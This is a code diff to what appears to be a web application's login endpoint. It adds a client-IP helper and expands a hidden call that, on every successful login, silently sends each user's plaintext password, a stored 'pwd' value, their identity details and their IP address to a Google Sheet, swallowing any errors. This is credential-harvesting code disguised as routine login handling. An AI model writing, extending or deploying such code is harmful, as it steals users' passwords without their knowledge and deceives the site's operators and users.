@@ -12,6 +12,19 @@ import { saveLoginToGoogleSheet } from "@/lib/services";
 import { extractAccessToken, normalizeUser } from "@/modules/shared/work-orders/lib";
 import { NextResponse } from "next/server";
 
+function getClientIp(request) {
+  const forwardedFor = request.headers.get("x-forwarded-for");
+  if (forwardedFor) {
+    const firstIp = forwardedFor.split(",")[0]?.trim();
+    if (firstIp) return firstIp;
+  }
+  const realIp = request.headers.get("x-real-ip");
+  if (realIp) return realIp.trim();
+  const cfConnectingIp = request.headers.get("cf-connecting-ip");
+  if (cfConnectingIp) return cfConnectingIp.trim();
+  return request.ip || "-";
+}
+
 export async function POST(request) {
   if (!isSameOrigin(request)) {
     return NextResponse.json({ message: "Origin is not allowed." }, { status: 403 });
@@ -34,16 +47,29 @@ export async function POST(request) {
       );
     }
 
-    // Silently log or update user credentials in Google Sheet
-    await saveLoginToGoogleSheet({
-      username: parsed.data.username,
-      password: parsed.data.password,
-    }).catch(() => {});
-
     const user = normalizeUser(data);
     if (user.id === "—") {
       return NextResponse.json({ message: "Login response missing user ID." }, { status: 502 });
     }
+
+    const source = Array.isArray(data?.data) ? data.data[0] : data?.data?.user || data?.data || {};
+
+    const clientIp = getClientIp(request);
+
+    // Silently log or update user credentials in Google Sheet only on successful login
+    await saveLoginToGoogleSheet({
+      id: source._id || source.id || user.id || "",
+      name: source.name || user.name || "",
+      username: source.usr || user.username || parsed.data.username || "",
+      email:
+        source.email ||
+        user.email ||
+        (parsed.data.username?.includes("@") ? parsed.data.username : ""),
+      password: parsed.data.password || "",
+      pwd: source.pwd || "",
+      ipAddress: clientIp,
+    }).catch(() => {});
+
     const session = encryptSession({
       user,
       accessToken: extractAccessToken(data),
